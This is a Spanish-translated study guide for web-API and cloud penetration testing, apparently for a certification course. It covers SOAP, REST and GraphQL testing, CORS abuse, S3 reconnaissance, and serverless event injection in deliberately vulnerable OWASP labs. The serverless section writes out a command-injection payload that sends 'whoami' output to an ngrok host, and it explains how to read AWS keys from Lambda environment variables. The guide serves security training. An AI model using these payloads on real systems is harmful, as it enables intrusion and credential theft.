# APIs y aplicaciones en la nube

* Introducción a las APIs
* Pruebas y ataques de API
* Control de acceso a la API
* Intercambio de recursos
* Atacar aplicaciones basadas en la nube

### Introducción a las APIs <a href="#introduction-to-apis" id="introduction-to-apis"></a>

API = Interfaz de programación de aplicaciones

* Es una colección de puntos finales sin GUI en una forma estandarizada, por lo que puede ser utilizada tanto por un usuario humano como por una máquina. A menudo va acompañado de documentación que puede estar tanto en una máquina como en un formato legible por humanos

Hay muchas APIs, por ejemplo:

```
- Windows API
- Remote APIs (RPC  - remote procedure call)
- Web APIs 
# Web services (SOAP/XML)
# REST APIs (JSON) 
```

Las API difieren de un sitio web porque:

```
- It has a standardized input/output form so that it can be scripted
- Its language independent (it should work on each platform in the same way)
- It aims to be secure (e.g. it allows only some predefined methods)
```

Las API SOAP utilizan el protocolo simple de acceso a objetos para definir el estándar de comunicación, de modo que se pueda pasar en ellas el aspecto de la solicitud y la respuesta, así como los parámetros.

Los mensajes SOAP (solicitudes HTTP) son un tipo XML y deben contener algunos elementos especiales

```
- Content type text/xml is also allowed
- SOAPAction is sometimes used just For the standard and sometimes needs to hold the called method name
```

![Texto alternativo](https://johnermac.github.io/assets/images/posts/ewptx/101.png)

![Texto alternativo](https://johnermac.github.io/assets/images/posts/ewptx/102.png)

API Contiene documentación legible tanto por humanos como por máquinas. En el caso de las API basadas en SOAP, la documentación se almacena en archivos WSDL. Normalmente, estos archivos se almacenan en la vía de acceso **?wsdl**

→ https://api.example.com/api/?wsdl

Eche un vistazo a un servicio de calculadora en línea de ejemplo:

→ http://www.dneonline.com/calculator.asmx

En la siguiente dirección:

```
→ http://www.dneonline.com/calculator.asmx?op=Add
# u can see an examplary SOAP request that was issued in order to speak to the calculator service

→ http://www.dneonline.com/calculator.asmx?wsdl
# to see the full WSDL
```

Este tipo de interfaz, dotada de documentación que puede ser analizada por una máquina, nos permite exponer un gran número de métodos donde cada uno de ellos tiene su propio propósito.

* Otro tipo de API son las API REST (Transferencia de estado de representación).

Normalmente, el método al que el cliente está a punto de llamar se encuentra en la ruta de acceso del recurso:

```
GET /api/v2/methodName
```

* Dependiendo del tipo de solicitud, los parámetros se pueden pasar de forma diferente

En las API REST, los métodos HTTP tienen un significado especial:

```
GET    - Read   resource
POST   - Create resource
PUT    - Update resource
DELETE - Delete resource
PATCH  - Update resource partially
```

Excepto en el caso de las solicitudes GET, los parámetros de los métodos de API se pasan en el cuerpo de la solicitud

> Recuerde que el significado de estos métodos es una práctica común y no un requisito, por lo que técnicamente es posible que un método que encuentre haga algo diferente (por ejemplo, POST se usa para iniciar sesión)

Un ejemplo de solicitud de API REST:

```
- Path often contains the API version
- Content-type application/json header is required
- Parameters are passed as JSON array
```

A menudo también es posible pasar los parámetros de la API REST como XML, por lo que el equivalente de la solicitud de la diapositiva anterior se vería como la lista de la derecha

La API REST también tiene un estándar de documentación llamado archivo WADL.

```
https://www.w3.org/Submission/wadl/
```

Al igual que WSDL, en breve presentaremos herramientas que ayudan a analizar el archivo largo para no reescribir todos los métodos manualmente.

* Con el fin de facilitar la vida de los desarrolladores (y pentesters), algunas API incluyen una representación de API más amigable para el ser humano. Por ejemplo, un nombre de motor API muy popular, **Swagger**, se encuentra a menudo con su página de demostración, que contiene formularios con descripción y posibilidad de emitir una solicitud a cada método.

Puedes ver un ejemplo de la API de Swagger aquí:

```
https://swagger.io/tools/swagger-ui/
```

#### Recursos <a href="#resources" id="resources"></a>

```
- https://swagger.io/
- https://www.w3.org/TR/wsdl.html
- https://www.w3.org/Submission/wadl/
- https://www.w3.org/TR/soap/
```

### Pruebas y ataques de API <a href="#api-testing-and-attacking" id="api-testing-and-attacking"></a>

Las API están construidas de manera que una ruta de solicitud (un punto final) nos permite llamar a un método (ejecutar un tipo de acción).

* La ruta que estamos solicitando es una asignación abstracta a algunos recursos; esto significa que, al solicitar el punto de conexión /api/v3/methodName, no refleja la estructura de archivos o directorios en el servidor.
* La solicitud es procesada por un componente especial que asigna la ruta de acceso a determinados controladores de operaciones y no a recursos físicos de archivo/directorio
* Sin embargo, no se desanime de usar sus herramientas de descubrimiento de contenido favoritas en el servidor habilitado para API. Algunas rutas de acceso del servidor se pueden asignar a las rutinas de la API, pero aún así, algunas solicitudes pueden ser manejadas por el servidor de una manera original, lo que le permite exponer archivos y directorios al usuario.

Independientemente del hecho de que las API hacen uso de métodos predefinidos, debe tener en cuenta que aún puede haber vulnerabilidades relacionadas con:

```
- Parameters to these predefined functions
- The API parsing itself
- Access to sensitive methods
```

En primer lugar, debes centrarte en el reconocimiento adecuado de la interfaz API:

```
- What is the API name and version?
- Its a custom implementation or a open-source product?
- Is there any online documentation available?
- Are there any interesting methods?
- Does the documentation exist on the target server (?wsdl, ?wadl, or similar)?
- Does the API require authentication, or is publicy available?
- If there is both local and public documentation For an API, do they match?
- Maybe some methods were hidden from local users (typically ones that allow insecure operations)
```

> Recopile tantos puntos de conexión de API como sea posible U también debería poder obtener el archivo WSDL/WADL para realizar más pruebas

* La reconstrucción de las llamadas a la API a partir de un archivo WSDL/WADL sin procesar llevaría mucho tiempo, por lo que una herramienta adecuada podría ayudarle a hacerlo más rápido.
* Para probar la API y analizar archivos WSDL/WADL en un conjunto de métodos listos para usar, es posible que desee usar **Postman**, la edición gratuita de **SOAPUI** o la extensión Burp PRO llamada **WSDLer**

#### SOAPUI <a href="#soapui" id="soapui"></a>

→ https://www.soapui.org/downloads/latest-release.html

SoapUI se puede iniciar desde su ubicación predeterminada

```
/usr/local/bin/SoapUI-5.5.0
locate SoapUI
```

Primero conéctalo al proxy, en este caso, la instancia de Burpsuite. De esta manera, podrá reproducir y cambiar las solicitudes emitidas a la API. Para configurar el proxy, debe ir a Archivo

```
  -> Preferences -> Proxy Settings and point it to BURP instance
```

![Texto alternativo](https://johnermac.github.io/assets/images/posts/ewptx/103.png)

> A continuación, puede activar y desactivar el proxy haciendo clic en el botón Proxy en el menú superior.

* Intentemos ahora analizar el archivo WSDL/WADL de ejemplo. Hay archivos de muestra que se envían con el propio software
* Para cargar un WSDL (para SOAP) o WADL (para REST), haga clic en los botones respectivos en la interfaz de usuario de Soap en el menú superior.

> De forma predeterminada, puede encontrar archivos WSDL/WADL de ejemplo en /root/SoapUI-Tutorials/WSDL-WADL/

* si ahora hace clic en un nodo de árbol y luego hace doble clic en **Solicitar**, aparecerá una ventana de solicitud. En este caso, estamos viendo el método de **inicio de sesión**.

![Texto alternativo](https://johnermac.github.io/assets/images/posts/ewptx/104.png)

El método también se puede encontrar en el archivo WSDL. SoapUI rellena automáticamente los marcadores de posición de argumentos con **?**. Es usted quien debe decidir qué rellenar allí.

* En ese caso, vemos que la aplicación espera el argumento de tipo **String**
* si presiona el botón verde, se emitirá la solicitud y, en este caso, se redirigirá a través de Burp Suite.

![Texto alternativo](https://johnermac.github.io/assets/images/posts/ewptx/105.png)

#### REPOSO <a href="#rest" id="rest"></a>

Las pruebas de las API REST se pueden hacer exactamente de la misma manera; La diferencia es que importa un archivo WADL en lugar de WSDL

*   Por lo tanto, una vez que encuentre un WSDL en la aplicación web, puede copiar su código fuente

    ```
    (Open it in a Browser, go to Source, and select all -> copy & past to a file) and import it to SoapUI
    ```
* La API es otro mecanismo de transporte Para obtener información que se envía al consumidor de la API (back-end de la aplicación)
* Con esto en mente, puede intentar manipular todo lo que transporta la API: por ejemplo, en caso de una solicitud similar a la presentada anteriormente, puede verificar si el campo de nombre de usuario o contraseñas es vulnerable a ataques de inyección

![Texto alternativo](https://johnermac.github.io/assets/images/posts/ewptx/106.png)

> La propia implementación de la API puede ser vulnerable a los ataques XXE; Sin embargo, las API modernas no suelen permitir declaraciones DTD

![Alt text](https://johnermac.github.io/assets/images/posts/ewptx/107.png)

Básicamente, puede manipular cualquiera de los parámetros de la API siempre que la estructura del mensaje SOAP sea correcta.

> En caso de que desee contrabandear datos de estilo XML, puede envolverlos en **etiquetas CDATA** (comentarios XML), para que el mensaje SOAP sea válido

![Texto alternativo](https://johnermac.github.io/assets/images/posts/ewptx/108.png)

### Control de acceso a la API <a href="#api-access-control" id="api-access-control"></a>

En las API, rara vez verá que se utilizan cookies. Más a menudo, el mecanismo de autenticación será una autorización básica o una especie de token

* Puede ser un token generado previamente que será equivalente a una cookie

Por ejemplo, en forma de encabezado como:

```
X-Api-Token:<token>
```

* Lo que a menudo se encuentra en las API es un control de acceso roto.
* Las omisiones de autorización son muy comunes

Para probar una API de una manera compleja para fallas de control de acceso, es necesario:

```
- Prepare a working request to each API endpoint
- Generate a token (or authorization header) For each of the API users
- Combine each API request with each token to see which will work and which do not
- Remember to test each request, also without any token
```

* Estos casos de prueba se pueden generar mediante SoapUI, que nos permite emitir una solicitud de prueba a cada punto de conexión de la API.
* Además, como recordatorio, verifique si la implementación de la API utiliza todos los métodos proporcionados por la versión original

Con la API de **Rundeck** existe la posibilidad predeterminada de ejecutar comandos del sistema operativo, que podrían estar ocultos de la documentación sobre una implementación de API local.

```
https://docs.rundeck.com/docs/api/rundeck-api.html#adhoc
```

Los tokens de API son susceptibles a vulnerabilidades comúnmente diagnosticadas en las cookies de sesión, por ejemplo:

```
- Low entropy or predictable value
- Lack of invalidation
- Possible token leaks from the application infrastructure or possibility to generate tokens in advance
```

> Los tokens que pueden otorgar acceso a una interfaz API son los tokens JWT, así como la **autenticación del portador**

### Intercambio de recursos <a href="#resource-sharing" id="resource-sharing"></a>

Como las API están destinadas a ser accedidas por agentes automatizados para perder un poco los contratantes de SOP, se implementó el estándar Cross-Origin Resource Sharing.

* En pocas palabras, CORS puede agregar algunas excepciones a SOP especificando algunos encabezados especiales en la respuesta del servidor.

Nos interesarán dos de estos encabezados:

```
- Access-Control-Allow-Origin: [value]
- Access-Control-Allow-Credentials: [true/false]
```

> El primero especifica un dominio que puede acceder a una determinada respuesta de sitios web El segundo especifica si es posible agregar información de credenciales (por ejemplo, cookies) a la solicitud

El valor de Access-Control-Allow-Origin puede ser un dominio, un comodín o un valor nulo

* Un comodín significa que un script alojado en cualquier dominio puede acceder a una respuesta desde esa página web
* Un determinado valor de dominio significa que los scripts (o cualquier otro usuario) de ese dominio pueden acceder a la respuesta

Si la página victim.com devuelve el encabezado **Access-Control-Allow-Origin:** example.com, eso significa que si un script de solicitud de XHR victim.com está alojado en example.com, y si el usuario visita example.com, el script accederá a victim.com como usuario y recibirá la respuesta.

Sin embargo, si se trata de una página estática, no sucede nada especial a menos que el victim.com permita otro encabezado **Access-Control-Allow-Credentials: true**

* En ese caso, si el usuario ha iniciado sesión victim.com y visita el script mencionado en example.com, victim.com visitará en el contexto de los usuarios registrados (las cookies se enviarán con una solicitud XHR) y el contenido restringido puede ser robado.
* Los navegadores bloquean de forma predeterminada las respuestas si un sitio es demasiado permisivo (si permiten el origen comodín junto con las credenciales)

> La confianza con credenciales para el origen del proyecto es una vulnerabilidad común, no solo en las API.

> Esto significa que si una página es accesible solo para usuarios registrados y confía en el origen arbitrario, un script de explotación se puede alojar en un dominio controlado por el atacante.

> Una vez visitado por un usuario que ha iniciado sesión en el sitio web de destino, puede robar información confidencial: datos de usuario o tokens CSRF.

#### Caso de explotación simple <a href="#simple-exploitation-case" id="simple-exploitation-case"></a>

Echemos un vistazo a un caso de explotación simple. Emitiremos una solicitud XHR similar a una página habilitada para CORS

Un archivo está alojado en un servidor apache habilitado para php

![Alt text](https://johnermac.github.io/assets/images/posts/ewptx/109.png)

![Texto alternativo](https://johnermac.github.io/assets/images/posts/ewptx/110.png)

si ahora navega a esa página mientras usa BURP como proxy, puede observar cómo reacciona a un encabezado **de origen** personalizado

![Alt text](https://johnermac.github.io/assets/images/posts/ewptx/111.png)

El script XHR ahora está midificado y example.com se reemplaza por la página habilitada para CORS

![Texto alternativo](https://johnermac.github.io/assets/images/posts/ewptx/112.png)

Ahora puede observar que se obtuvo acceso a la respuesta. En un escenario de explotación, es posible que desee enviar estos datos a su servidor controlado de una manera similar a como lo haría con una cookie utilizando un XSS vuln.

![Alt text](https://johnermac.github.io/assets/images/posts/ewptx/113.png)

### Atacar aplicaciones basadas en la nube <a href="#attacking-cloud-based-apps" id="attacking-cloud-based-apps"></a>

**Microservicios**: Diferentes arquitecturas y evolución del diseño

#### Diseño monolítico: <a href="#monolithic-design" id="monolithic-design"></a>

Se utiliza un servidor para almacenar la aplicación web y los servicios necesarios, como las bases de datos. Esto ofrece una fácil configuración y facilidad de mantenimiento a un precio relativamente barato, pero presenta varias desventajas.

* Los diseños monolíticos son difíciles de escalar y, aunque el mantenimiento es relativamente fácil, la actualización del servidor podría causar retrasos y tener un solo punto de falla puede ser un desastre si no hay un plan de respaldo establecido.

#### Monolítico escalonado: <a href="#tiered-monolithic" id="tiered-monolithic"></a>

Los servicios están separados, el servidor web contiene la aplicación web mientras que un servidor diferente contiene la base de datos o los servicios necesarios.

* La arquitectura monolítica por niveles ofrece la posibilidad de realizar actualizaciones sin tiempo de inactividad y, si los servidores están agrupados y equilibrados de carga, el rendimiento mejora con respecto al enfoque anterior.
* Los diseños monolíticos escalonados siguen siendo difíciles de escalar, esto es algo que no se puede automatizar y, si el clúster en sí puede ser un único punto de fallo, solo se puede recuperar de las copias de seguridad en caso de que ocurra un desastre.

#### Soluciones en la nube: <a href="#cloud-solutions" id="cloud-solutions"></a>

Las soluciones en la nube están integradas en servidores o servicios elásticos. Esto significa que el escalado horizontal es posible de implementar y automatizar por completo, lo que brinda un mejor rendimiento a medida que se crean nuevas instancias en función de los recursos necesarios.

* Las actualizaciones también se pueden realizar sin tiempo de inactividad y los desastres no implican copias de seguridad en la mayoría de los casos. Aunque hay muchas ventajas sobre los diseños anteriores, todavía hay problemas en la capa de aplicación, ya que sigue siendo una gran base de código (monolítica) y los costos pueden ser difíciles de prever dependiendo de los servicios necesarios.

#### Aplicaciones sin servidor <a href="#serverless-applications" id="serverless-applications"></a>

Función como servicios (FaaS): son aplicaciones sin servidor, generalmente funciones de código, que se ejecutan en un entorno de nube. Este entorno en la nube y el ataque a la aplicación son gestionados por el operador de la nube. Como resultado, tiene la ventaja de evitar la complejidad de crear y mantener la infraestructura típicamente asociada con el desarrollo y lanzamiento de una aplicación.

* Las aplicaciones sin servidor tienen algunas limitaciones a tener en cuenta, el tiempo de ejecución se limita a unos pocos minutos, los subprocesos, el espacio en disco utilizable y la memoria RAM también son limitaciones y existe la necesidad de un desencadenador/evento para ejecutar la aplicación y un método de enrutamiento o puerta de enlace de API.

> Teniendo en cuenta estas limitaciones, las aplicaciones serverless no son la mejor opción para recursos que demandan trabajos o tareas que necesitan más de 10 minutos de ejecución.

**Detalles de la arquitectura sin servidor**

* **Enrutamiento de API: capa de enrutamiento** que llama a la aplicación en función de la asociación de URL, las reglas y los parámetros. Hacen que las funciones sean accesibles desde Internet.

En AWS se llama API Gateway.

* **Estado**: Como se mencionó anteriormente, la vida útil de una función no es más de unos pocos minutos, por esta razón no hay caché local que se pueda usar y vulnerabilidades como inyecciones de comandos de archivos o cargas de archivos se explotan de una manera diferente debido a estos hechos.
* **Arranque en frío**: Como la vida útil es limitada, cuando el código no se ha ejecutado en un tiempo o por primera vez, debe descargarse, incluirse en contenedores, arrancarse y prepararse para ejecutarse. Esto se puede resolver utilizando complementos de terceros como:

→ http://github.com/Fidellimited/serverless-plugin-warmup

* **Depuración**: tener la ventaja de no administrar la infraestructura significa que existen limitaciones con la depuración debido a la falta de acceso a los registros. En lugar del registro, se suelen poner en práctica otros enfoques, como la impresión de variables o lambda local, para aplicaciones de depuración.
* **Sin operaciones: tareas limitadas** de administrador del sistema, ya que el entorno es administrado por el operador de la nube. Las copias de seguridad, el monitoreo de seguridad y el registro siguen siendo necesarios.
* Con los microservicios y las aplicaciones sin servidor, hay algunos cambios relacionados con la seguridad. La seguridad de la red cambia drásticamente, ya que el modelo de seguridad de las funciones no se basa en direcciones IP y puertos. En cambio, comparten la misma dirección IP externa y no hay restricciones de red local para ellos dentro del host.

> Aunque las restricciones de red apenas se utilizan, para aplicar restricciones se utilizan controles de acceso y permisos proporcionados por la nube.

**Ejemplo de aplicación sin servidor**

Es necesaria una cuenta de AWS para esta prueba

* https://github.com/OWASP/DVSA

Vaya a **https://aws.amazon.com/lambda** para empezar a crear una función:

```
1. Go to lambda, create application
2. Other Options
3. Browser Serverless app repository
4. Mark the option "Show apps that create custom IAM roles or resource policies"
5. Search DVSA
```

Vaya al almacén de parámetros de AWS System Manager y busque la URL de DVSA

* Ahora dirígete a la URL y registra una cuenta. Debe ser un correo electrónico real para recibir el código de activación.

> La aplicación ha sido desplegada y volveremos a ella más adelante. Recuerde eliminar los recursos una vez que termine de trabajar con ellos.

#### S3 Buckets <a href="#s3-buckets" id="s3-buckets"></a>

Simple Storage Service (S3) es un sistema de archivos distribuido y escalable de AWS. Estas carpetas raíz del sistema de archivos se denominan cubos, mientras que todo lo demás (archivos, subcarpetas) se denominan objetos. Los buckets de S3 mal configurados han sido la causa principal de muchas fugas de información y ataques contra las organizaciones.

Vamos a crear un nuevo bucket de S3:

* Al crear cubos, hay varias opciones de configuración que se pueden seleccionar en el proceso.
* El control de acceso y el cifrado se pueden especificar en esta etapa.
* Los ataques comunes de S3 consisten en el acceso no autorizado a objetos. Los ataques a menudo brindan la capacidad de modificar y crear nuevos objetos y cambiar las políticas y permisos existentes en los buckets de S3.

**Herramienta: S3Recon**

* https://github.com/clarketm/s3recon

La automatización de la detección de buckets mal configurados se puede realizar mediante S3Recon.

**Python-pip** se puede usar para instalar S3Recon, aunque es posible que sea consciente de las dependencias faltantes durante el proceso e instalarlas también.

```
pip install s3recon
```

S3Recon necesita una lista de palabras, hay una en el repositorio de Github o se puede crear una personalizada en función de sus necesidades. En este momento se usará el del repositorio.

```
curl -sSfL -o "word-list.txt" "https://raw.githubusercontent.com/clarketm/s3recon/master/data/words.txt"
```

La ejecución de S3 Recon con el archivo worslist se puede hacer con:

```
s3recon "word-list.txt" -o "results.json" --public
```

Los depósitos marcados como **públicos** podrían dar acceso a contenido restringido. Se podía acceder a los objetos a través de aws-cli.

> S3Recon se puede integrar con MongoDB para obtener grandes resultados. Esto resulta útil en programas de recompensas por errores en los que los activos que pertenecen a la empresa están dentro del alcance.

**Informes de hackerone relacionados con errores de configuración de S3**

```
- https://hackerone.com/reports/631529
- https://hackerone.com/reports/507097
- https://hackerone.com/reports/504600
- https://hackerone.com/reports/209223
```

#### URL firmadas por AWS <a href="#aws-signed-urls" id="aws-signed-urls"></a>

Se puede utilizar para dar acceso temporal a los objetos. Cualquier usuario que tenga esta URL podrá descargar el objeto durante un tiempo limitado. Son comúnmente utilizados por los proveedores de streaming.

* Cree un bucket privado y agréguele algunos archivos.
* Al intentar acceder a cualquiera de estas URL, aparecerá un error **AccessDenied** porque el bucket se ha configurado como privado.
* Con aws-cli, u debería poder acceder a estos objetos una vez que se haya configurado a través **del comando aws-cli configure**.

Los archivos se pueden copiar usando

```
aws-cli cp <S3URI> <LOCALPATH>
```

**Creación de URL firmadas**

Las URL firmadas se pueden generar usando la biblioteca boto3 para python

```
pip install boto3
```

Al visitar la URL firmada, se muestra el contenido del objeto.

* Las URL firmadas dan acceso a un único archivo. Este método no se escala cuando se necesita acceso a un conjunto de objetos.
* Por esta razón, las cookies firmadas se pueden utilizar para dar acceso a más de un objeto a la vez.

#### Inserción de eventos sin servidor <a href="#serverless-event-injection" id="serverless-event-injection"></a>

Las funciones sin servidor escuchan eventos o desencadenadores para que se ejecuten. Estos eventos se pueden inyectar desde otras fuentes de confianza en entornos de nube, lo que conduce a una vulnerabilidad de inyección de eventos sin servidor. Estas fuentes confiables pueden ser:

```
- Actions on S3 Objects
- Alerting Systems (CloudWatch)
- API Gateway Calls
- Changes in the code repository
- Database events
- HTTP APIs
```

Algunas funciones sin servidor ejecutan contenido de shell o eval con una entrada que no es de confianza. Por ejemplo, imagine una función con el ejemplo anterior en la que los URI de S3 están controlados por el usuario.

```
"os.system("aws S3 cp {0} {1} ".format(src_object,dst_object))"
```

> Si somos capaces de controlar alguna de estas variables, un comando de inyección vuln cambia el nombre del nombre del fichero.

#### Escenario de inserción de eventos sin servidor <a href="#serverless-event-injection-scenario" id="serverless-event-injection-scenario"></a>

Recuerde que las funciones sin servidor viven durante un tiempo limitado. Esto se debe a que se ejecutan en un pequeño servidor que vive durante unos minutos, esto significa que pueden existir vulnerabilidades regulares, pero solo durante el tiempo que el servidor está vivo.

La aplicación convierte archivos de documentos de Word en texto. Toma una URL (por defecto se proporciona) y muestra su contenido en la pantalla.

```
OWASP ServerlessGoat
```

* La función se invoca mediante una llamada a AWS API Gateway. Podemos observar cómo se emite el comando bloqueando la aplicación.
* Observando la configuración de API Gateway podemos entender que este endpoint funciona como un proxy de Lambda, cuando las funciones serverless reciben el evento del proxy se invoca.

Como hemos visto el código vulnerable y donde se realiza la inyección. Intente inyectar algunos comandos

```
* use **>/dev/null** after the document URL to receive a clean output
```

* Como el servidor se reciclará debido a su vida útil limitada, no tiene sentido intentar una puerta trasera.

> Sin embargo, las funciones lambda almacenan claves de AWS en variables de entorno. Se puede acceder a ellos usando **env** o **cat /proc/self/environ**

**Escenario 2 de inserción de eventos sin servidor**

Volver a **Damn Vuln Aplicación sin servidor** instalada antes para descubrir más eventos que se pueden inyectar

* Visite la URL y agregue algunos elementos al carrito
* Ingrese detalles aleatorios en la información de envío y envíelos para recibir el recibo.
* Si echas un vistazo al mensaje del pedido, contendrá un bucket de S3 con un UUID para la recepción del pedido
* Parece que el recibo se está copiando desde una carpeta de bucket de S3 generada con la fecha y el UUID de los recibos.

Los permisos de este bucket son relativamente abiertos, ya que se permite cargar archivos a través de:

```
"echo "blah">file.txt && aws s3 cp file.txt 's3://<BUCKET>/2020/20/20/whatever' -acl public-read"
```

Se ha confirmado que el bucket de S3 está abierto para lectura/escritura para todos. Vamos a comprobar el código en:

```
https://github.com/OWASP/DVSA/blob/master/backend/src/functions/processing/send_receipt_email.py
```

El controlador de eventos lee el nombre, la clave y el orden del bucket y, a continuación, la función reemplaza la extensión **.raw** por **.txt** lo que significa que esperan un objeto de S3 sin procesar. A continuación, se crea una ruta de descarga y se registra en un archivo de registro mediante **os.system**

> Tengo impresiones con estos ejemplos, pero la calidad no es muy buena. Así que no voy a publicarlo

* Al igual que en el ejemplo anterior, la aplicación pasa a la función os.system algún contenido que podemos controlar ya que los permisos del bucket de S3 son débiles.
* Siguiendo la convención de nombres, la función espera que se pueda cargar y ejecutar una carga útil de inyección de comandos del sistema operativo mediante la API de AWS de S3.

**Ngrok** - https://ngrok.com/

* Ngrok se usará para exponer puertos locales a Internet y capturar un shell inverso Para este ejercicio. Visite el sitio web https://ngrok.com y registre una cuenta.
* Una vez creada la cuenta, descargue el cliente ngrok para su sistema operativo y autonídelo siguiendo las instrucciones de **conexión de la cuenta**
* Una vez configurada la cuenta, puede exponer un puerto local a Internet que ejecute **ngrok http 80** y tome nota de la dirección URL.

Las solicitudes recibidas en el puerto 80 se pueden comprobar en la interfaz web local

```
http://127.0.0.1:4040
```

* Ahora, utilizando la misma convención de nomenclatura que espera la función, se puede crear una carga útil para lograr RCE y recibir la respuesta a nuestra interfaz expuesta.

Carga útil:

```
aws s3 cp empty.txt
s3://<your bucket id>/2020/20/20/whatever_;curl XXX.grok.io?data="$(whoami)";echo x.raw -acl public-read
```

```
whatever_; # it checks For an underscore in the file name
Curl something.ngrok.io # THe ngrok endpoint to send the output
"$(whoami)"; # the command to run
Echo x.raw # needs to end in .raw to be triggered
```

* Con todo en su lugar, vaya y verifique la interfaz web de Ngrok para verificar que haya algunas solicitudes.
* Ngrok ahora recibirá las solicitudes que se pueden descodificar para obtener el resultado del comando
* Si genera el resultado del comando **env**, incluirá las claves de AWS utilizadas por las funciones lambda. Como resultado, tendrán los mismos privilegios que se les otorgan y se utilizan con la API.
* En este punto, la pila DVSA se puede eliminar del servicio de AWS de CloudFormation y de los buckets de S3

#### API de GraphQL <a href="#graphql-apis" id="graphql-apis"></a>

GraphQL es un tipo diferente de interfaz de API en la que hay un punto final para una API (en lugar de muchos puntos finales en REST) y dos tipos de operaciones (Query y Mutate) en lugar de 5 o más en REST (GET, PUT, POST, PATCH, DELETE)

* Por lo general, example.com/graphql o algo similar (Buena idea de los idiotas de Google)
* REST suele tener un endpoint para cada tipo de objeto (usuarios, grupos, artículos, libros, pedidos, envíos... etc) con 3 o más operaciones en cada punto de conexión
* En GraphQL, el mismo punto de conexión sirve a todos los objetos predefinidos en los métodos Query y Mutation

**Términos de GraphQL**

```
- Query: A query operation on an object or type
- Mutate: an update operation on an object, like creating a new one, updating it fully, updating it partially, or deleting it
- Type (objecttype): A type of object, like a class or table, e.g. Users, Orders, books
- Schema: Describes the types, fields and actions available
- Introspection: A method to learn more about the schema details like types and fields
- Resolver: A function that connects schema definitions to actual backend data sources like SQL tables
- Scalar Type: Type of data For a field, like string, int or custom types.
```

![Texto alternativo](https://johnermac.github.io/assets/images/posts/ewptx/114.png)

También se puede llamar a GraphQL desde la línea de comandos usando curl:

```
- Using POST
- Content-type is JSON
- Output is sent to jq For pretty JSON
```

Llamar a un objeto en particular en GraphQL:

```
curl -X POST -H "Content-Type: application/json" --data '{"query":"{user(id:\"2\") {id username} }"}' http://localhost/graphql | jq
```

**Consultas de anidamiento de GraphQL**

Mostrar cada usuario con sus suscripciones de grupo usando GraphQL, mostrando el id y el nombre del grupo

> Sugerencia: grupos {id name} Pruebe tanto GraphQL como Curl

**Seguridad en GraphQL**

GraphQl no tiene una comprensión integrada de la seguridad. Devolverá el objeto tal y como se solicitó

* Sin un filtrado explícito, los datos confidenciales podrían exponerse y extraerse
* ¿Podemos leer información confidencial del usuario, como contraseñas?

**Realizar actualizaciones en GraphQL**

En graphql, las actualizaciones (adición, creación, eliminación) se denominan mutaciones

Ejemplo con 3 mudaciones:

```
class Mutation(graphene.ObjectType):
  create_user = CreateUser.Field()
  update_user = UpdateUser.Field()
  delete_user = DeleteUser.Field()
```

**Mutación Deleteuser**

La mutación deleteUser puede ser llamada por:

```
- Defining the query type to be mutation
- Selecting the named deletUser mutation
- Supplying the id to be deleted, and a sub selection For response (ok field here)
```

```
mutation deleUser
{
  deleteUser(id:24)
  {
    ok
  }
}
```

```
curl -s -X POST -H "Content-Type: application:json" --data '{"query":"mutation {deleteUser(id:22){ok}}"}' http://localhost/graphql | jq
```

#### Función como servicio <a href="#function-as-a-service" id="function-as-a-service"></a>

Function as a Service (FaaS) es un tipo de arquitectura de software moderna (a partir de principios de 2020). Está implementado en los proveedores de nube más comunes como AWS Lambda, Google Cloud Functions, IBM OpenWhisk o Microsoft Azure Functions

* El modelo FaaS nos permite ejecutar código en respuesta a eventos sin necesidad de mantener ninguna infraestructura para ello (aparte de la cuenta en la nube). Permite al usuario simplemente cargar fragmentos modulares de funcionalidades en la nube y se ejecutan de forma independiente

Dicha solución permite una mejor escalabilidad y es un siguiente nivel de división de una aplicación monolítica en piezas funcionales

Un ejemplo de _Hello World_ en FaaS (escrito en Node.js)

![Texto alternativo](https://johnermac.github.io/assets/images/posts/ewptx/115.png)

* A pesar de ser una función, hay que tener en cuenta que cualquier servicio online intercambia y procesa datos o realiza cualquier tipo de autenticación. Esto es exactamente lo mismo sujeto a abuso que cualquier otra aplicación web o en la nube

Puede experimentar más con el software sin servidor descargando y jugando con DVFaaS:

```
https://github.com/we45/DVFaaS-Damn-Vulnerable-Functions-as-a-Service
```

> Cada subdirectorio del proyecto contiene pasos detallados a seguir para implementar y explotar una instancia vulnerable

\
